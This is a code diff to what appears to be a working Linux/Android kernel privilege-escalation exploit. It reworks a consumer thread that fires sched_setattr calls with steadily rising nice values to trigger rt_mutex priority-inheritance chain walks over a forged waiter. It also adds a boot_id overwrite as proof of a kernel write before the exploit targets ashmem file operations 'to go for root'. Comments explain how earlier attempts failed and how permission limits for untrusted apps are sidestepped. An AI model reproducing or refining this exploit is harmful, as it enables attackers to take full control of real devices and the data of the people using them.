@@ -13,6 +13,7 @@ atomic_int punch_consume_go;
 atomic_int punch_consume_stop;
 atomic_int consumer_calls;
 atomic_int consumer_success;
+atomic_int pselect_armed;
 atomic_int main_route_delay_usec;
 atomic_int pipe_prepare_request;
 atomic_int pipe_prepare_done;
@@ -125,6 +126,10 @@ void *consumer_thread(void *arg __attribute__((unused))) {
 
   int seen = 0;
   int heap_spray_done = 0;
+  /* Monotonic across the whole route: every attempt targets the SAME waiter
+   * thread, so each call must raise nice by one to force a real reschedule
+   * (see the comment at the sched_setattr call below). */
+  int consumer_nice_seq = 0;
 
   while (!atomic_load(&punch_consume_stop)) {
     int seq = atomic_load(&punch_consume_go);
@@ -182,43 +187,86 @@ void *consumer_thread(void *arg __attribute__((unused))) {
       }
     }
 
+    /* Wait until the waiter is actually INSIDE pselect (overlay installed).
+     * Firing before that walks the residual rt_waiter, whose tree_entry was
+     * RB_CLEARed by remove_waiter() -> rt_mutex_dequeue() returns before
+     * rb_erase -> the walk survives and writes NOTHING (the exact signature
+     * every device run showed). The old code fired a fixed delay after
+     * punch_consume_go, but do_pselect_fake_lock_route logged (and fsync'd!)
+     * between the store and the syscall, so a slow /data fsync ate the window. */
+    int armed = 0;
+    for (int spin = 0; spin < 40000; spin++) {
+      if (atomic_load(&punch_consume_stop)) {
+        break;
+      }
+      if (atomic_load(&pselect_armed)) {
+        armed = 1;
+        break;
+      }
+      usleep(50);
+    }
+    if (!armed) {
+      pr_info("consumer seq=%d pselect never armed; skipping\n", seq);
+      atomic_store(&punch_consume_go, 0);
+      continue;
+    }
+
+    int delay_usec = atomic_load(&main_route_delay_usec);
+    if (delay_usec > 0) {
+      usleep((useconds_t)delay_usec);
+    }
+
     int calls_this_seq = 0;
-    while (!atomic_load(&punch_consume_stop) &&
-           atomic_load(&punch_consume_go) == seq) {
-      if (atomic_load(&punch_consume_stop) ||
-          atomic_load(&punch_consume_go) != seq) {
-        continue;
+    for (int burst = 0; burst < PSELECT_CONSUMER_BURST_CALLS; burst++) {
+      if (atomic_load(&punch_consume_stop) || !atomic_load(&pselect_armed)) {
+        break;
       }
-      int delay_usec = atomic_load(&main_route_delay_usec);
-      if (delay_usec > 0) {
-        usleep((useconds_t)delay_usec);
+      /* The nice value MUST strictly INCREASE on every call:
+       *  - identical (policy, nice) makes __sched_setscheduler take the
+       *    `if (unlikely(policy == p->policy))` early-out (kernel/sched/core.c
+       *    5594) and `goto unlock`, which RETURNS 0 WITHOUT calling
+       *    rt_mutex_adjust_pi() -> no chain walk at all. Only the very first
+       *    call of the process (SCHED_OTHER -> SCHED_BATCH) ever changed the
+       *    policy, so attempts 2..8 were silent no-ops that still reported
+       *    success=1. THIS was the "walk never writes" blocker.
+       *  - a LOWER nice is a priority increase and needs CAP_SYS_NICE/
+       *    RLIMIT_NICE (EPERM for untrusted_app), so never go back down.
+       * nice 1..19 => SCHED_BATCH prio 121..139, always != the fake waiter's
+       * prio 3, so rt_mutex_waiter_equal() keeps letting the walk through. */
+      int consumer_nice =
+          env_int_range("PSELECT_CONSUMER_NICE_VALUE", 0, 0, 19);
+      if (consumer_nice <= 0) {
+        consumer_nice = ++consumer_nice_seq;
+        if (consumer_nice > PSELECT_CONSUMER_NICE) {
+          consumer_nice = PSELECT_CONSUMER_NICE;
+        }
       }
-      for (int burst = 0; burst < PSELECT_CONSUMER_BURST_CALLS; burst++) {
-        if (atomic_load(&punch_consume_stop) ||
-            atomic_load(&punch_consume_go) != seq) {
-          break;
-        }
-        atomic_fetch_add(&consumer_calls, 1);
-        int consumer_nice = env_int_range(
-            "PSELECT_CONSUMER_NICE_VALUE", PSELECT_CONSUMER_NICE, -20, 19);
-        errno = 0;
-        long sched_ret = sched_setattr_tid(tid, consumer_nice);
-        int sched_errno = errno;
-        if (sched_ret == 0) {
-          atomic_fetch_add(&consumer_success, 1);
-        } else {
-          pr_info("consumer sched_setattr seq=%d ret=%ld errno=%d tid=%d "
-                  "fake_lock=%016llx fake_w0=%016llx fake_fops=%016llx\n",
-                  seq, sched_ret, sched_errno, tid, fake_lock, fake_w0,
-                  fake_fops);
-        }
-        calls_this_seq++;
-        if (calls_this_seq >= CONSUMER_MAX_CALLS) {
-          atomic_store(&punch_consume_go, 0);
-          break;
-        }
+      errno = 0;
+      int nice_before = getpriority(PRIO_PROCESS, tid);
+      atomic_fetch_add(&consumer_calls, 1);
+      errno = 0;
+      long sched_ret = sched_setattr_tid(tid, consumer_nice);
+      int sched_errno = errno;
+      errno = 0;
+      int nice_after = getpriority(PRIO_PROCESS, tid);
+      /* The nice value actually CHANGING is the only proof that
+       * __sched_setscheduler reached `change:` and therefore ran
+       * rt_mutex_adjust_pi(p) == the chain walk. sched_ret==0 alone is not
+       * (the no-op early-out returns 0 too). */
+      int walked = (sched_ret == 0 && nice_after != nice_before);
+      if (walked) {
+        atomic_fetch_add(&consumer_success, 1);
+      }
+      pr_info("consumer walk seq=%d ret=%ld errno=%d nice=%d->%d want=%d "
+              "walked=%d tid=%d fake_lock=%016llx fake_w0=%016llx\n",
+              seq, sched_ret, sched_errno, nice_before, nice_after,
+              consumer_nice, walked, tid, fake_lock, fake_w0);
+      calls_this_seq++;
+      if (calls_this_seq >= CONSUMER_MAX_CALLS) {
+        break;
       }
     }
+    atomic_store(&punch_consume_go, 0);
   }
 
   return NULL;
@@ -307,6 +355,20 @@ int run_exploit(int argc, char **argv) {
   kaslr_slide = 0;
   kaslr_done = 1;
   pr_success("direct-map base=%016llx slide=%016llx\n", kaslr_base, kaslr_slide);
+
+  /* Spend route attempt 1 on the BOOTID write-proof: the rb-erase store goes to
+   * &sysctl_bootid instead of &ashmem_misc.fops, so /proc/sys/kernel/random/boot_id
+   * changing is direct, harmless, non-circular proof that the chain-walk store
+   * executes here. Must be set BEFORE prepare_good_kernel_page(), which bakes
+   * pselect_write_target() into the sprayed payload. Attempts 2+ re-groom with
+   * the real fops target and go for root. */
+  bootid_proof_active = bootid_write_proof_enabled();
+  if (bootid_proof_active) {
+    read_first_line("/proc/sys/kernel/random/boot_id", bootid_proof_before,
+                    sizeof(bootid_proof_before));
+    pr_success("ckpt: BOOTID-WRITE-PROOF armed target=%016llx before=%s\n",
+               (unsigned long long)data_addr(SYSCTL_BOOTID), bootid_proof_before);
+  }
 
   pin_to_core(CORE);
   page_base = prepare_good_kernel_page(PAGE_PAYLOAD_FOPS);
